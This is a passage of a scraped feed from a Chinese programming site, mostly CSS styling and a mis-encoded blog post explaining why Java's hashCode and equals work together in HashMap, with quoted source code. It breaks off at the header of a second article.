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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æ—©ä¸Šåœ¨é¢ä¸€å®¶å…¬å¸çš„æ—¶å€™ è¢«é—®åˆ°æœ‰äº†equalsä¸ºä»€ä¹ˆè¿˜è¦hashcodeæ–¹æ³•
æœ¬æ¥æ˜¯ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„é—®é¢˜ ä½†æ˜¯åœ¨è®²å®Œå„è‡ªçš„ä½œç”¨åæƒ³è®²è®²è‡ªå·±çš„ç†è§£çš„æ—¶å€™çªç„¶å¡å£³ æ‰€ä»¥å†™ä¸€ç¯‡æ–‡ç« æ¥æ¢³ç†ä¸€ä¸‹è¿™ä¸ªé€»è¾‘</p>
<h2 data-id="heading-1">åˆ†æ</h2>
<p>é¦–å…ˆ equalså’Œhashcodeæ–¹æ³•é€šå¸¸æ˜¯æˆå¯¹å‡ºç°çš„ åœ¨ä½¿ç”¨ä¸€äº›å“ˆå¸Œç»“æ„çš„æ—¶å€™éå¸¸é‡è¦ æ¯”å¦‚HashMap HashTableç­‰</p>
<ul>
<li>equalsæ–¹æ³• ç”¨äºåˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰ æˆ‘ä»¬å¯ä»¥é‡å†™equalsæ–¹æ³• æ¥å†³å®šä¸¤ä¸ªå¯¹è±¡ç›¸ç­‰çš„é€»è¾‘ æ¯”å¦‚åœ¨Stringç±»ä¸­ é‡å†™äº†equalsæ–¹æ³• è®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ é‚£å°±æ˜¯ç›¸ç­‰çš„</li>
<li>hashcodeæ–¹æ³• è¿”å›ä¸€ä¸ªæ•´æ•°å“ˆå¸Œç  ä»è€Œå¿«é€Ÿå®šä½å­˜å‚¨ä½ç½® æé«˜æŸ¥è¯¢æ•ˆç‡</li>
</ul>
<p>ç†è§£å®Œä»–ä»¬çš„ä½œç”¨å æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹HashMapçš„æºç  æˆ‘è¿™é‡Œå±•ç¤ºäº†putçš„éƒ¨åˆ†æºç </p>
<pre><code class="hljs language-ini" lang="ini">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
               boolean evict) {
    Node&lt;K,V&gt;<span class="hljs-section">[]</span> tab<span class="hljs-comment">; Node&lt;K,V&gt; p; int n, i;</span>
    if ((<span class="hljs-attr">tab</span> = table) == null || (n = tab.length) == <span class="hljs-number">0</span>)
        <span class="hljs-attr">n</span> = (tab = resize()).length<span class="hljs-comment">;</span>
    if ((<span class="hljs-attr">p</span> = tab[i = (n - <span class="hljs-number">1</span>) &amp; hash]) == null)
        tab<span class="hljs-section">[i]</span> = newNode(hash, key, value, null)<span class="hljs-comment">;</span>
    else {
        Node&lt;K,V&gt; e<span class="hljs-comment">; K k;</span>
       //å¦‚æœå“ˆå¸Œå€¼ç›¸ç­‰ 
        if (<span class="hljs-attr">p.hash</span> == hash &amp;&amp;
        //åˆ¤æ–­åœ°å€ç›¸åŒ æˆ–è€… é€»è¾‘ç›¸åŒ
            ((<span class="hljs-attr">k</span> = p.key) == key || (key != null &amp;&amp; key.equals(k))))
            <span class="hljs-attr">e</span> = p<span class="hljs-comment">;</span>
        else if (p instanceof TreeNode)
            <span class="hljs-attr">e</span> = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value)<span class="hljs-comment">;</span>
        else {
            for (int <span class="hljs-attr">binCount</span> = <span class="hljs-number">0</span><span class="hljs-comment">; ; ++binCount) {</span>
                if ((<span class="hljs-attr">e</span> = p.next) == null) {
                    <span class="hljs-attr">p.next</span> = newNode(hash, key, value, null)<span class="hljs-comment">;</span>
                    if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st
                        treeifyBin(tab, hash)<span class="hljs-comment">;</span>
                    break<span class="hljs-comment">;</span>
                }
              //   //å¦‚æœå“ˆå¸Œå€¼ç›¸ç­‰ 
                if (<span class="hljs-attr">e.hash</span> == hash &amp;&amp;
                //åœ°å€ç›¸åŒ æˆ–è€… é€»è¾‘ç›¸åŒ
                    ((<span class="hljs-attr">k</span> = e.key) == key || (key != null &amp;&amp; key.equals(k))))
                    break<span class="hljs-comment">;</span>
</code></pre>
<p>é€šè¿‡æŸ¥çœ‹æºç å¯ä»¥å‘ç° hashcodeçš„è®¡ç®—å€¼</p>
<ul>
<li>ç”¨äºå¯»æ‰¾æ’å…¥ä½ç½® å¹¶ä¸”ç”¨äºå¿«é€Ÿåˆ¤æ–­ä¸¤ä¸ªå…ƒç´ æ˜¯å¦ç›¸åŒ</li>
<li>å¦‚æœç›¸åŒå†åˆ¤æ–­ä¸¤ä¸ªå…ƒç´ æ˜¯å¦æ˜¯åŒä¸€ä¸ªå…ƒç´ </li>
</ul>
<hr/>
<h2 data-id="heading-2">æ€»ç»“</h2>
<p>æ€»çš„æ¥è¯´</p>
<blockquote>
<p>åˆ†ä¸ºä¸¤æ–¹é¢ æé«˜æ•ˆç‡ ä¿è¯å¯¹è±¡å”¯ä¸€æ€§</p>
</blockquote>
<p>hashcodeæä¾›äº†ä¸€ç§å¿«é€Ÿè®¡ç®—å¯¹è±¡å“ˆå¸Œå€¼çš„æ–¹å¼ å¯ä»¥å¿«é€Ÿå®šä½åˆ°å…ƒç´ åº”è¯¥å­˜æ”¾åœ¨å“ª æé«˜äº†æŸ¥è¯¢å’Œå­˜æ”¾æ•ˆç‡</p>
<p>å¦å¤–ä¸€æ–¹é¢ å’ŒequalsåšååŒ ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§å’Œå®Œæ•´æ€§  é€šè¿‡HashMapçš„æºç ä¹Ÿå¯ä»¥çœ‹åˆ° ä»–ä¼šç¼“å­˜å·²æœ‰é”®å€¼å¯¹çš„å“ˆå¸Œç  ç”¨äºå¿«é€Ÿåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨   å¦‚æœä¸¤ä¸ªå¯¹è±¡çš„hashcodeå€¼ä¸åŒ é‚£ä¹ˆå°±ä¸å¯èƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ å¦‚æœç›¸åŒ å†é€šè¿‡equalsåˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰ æ—¢ä¿è¯äº†æ­£ç¡®æ€§ åˆæé«˜äº†æ€§èƒ½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Easy Queryä¸­é—´ä»¶çš„ä½¿ç”¨]]></title>    <link>https://juejin.cn/post/7595358285722533897</link>    <guid>https://juejin.cn/post/7595358285722533897</guid>    <pubDate>2026-01-15T08:13:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595358285722533897" data-draft-id="7595358285722419209" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Easy Queryä¸­é—´ä»¶çš„ä½¿ç”¨"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T08:13:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸ç´ ä¹‹å®¢"/> <meta itemprop="url" content="https://juejin.cn/user/3881741097384843"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Easy Queryä¸­é—´ä»¶çš„ä½¿ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3881741097384843/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸ç´ ä¹‹å®¢
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:13:59.000Z" title="Thu Jan 15 2026 08:13:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
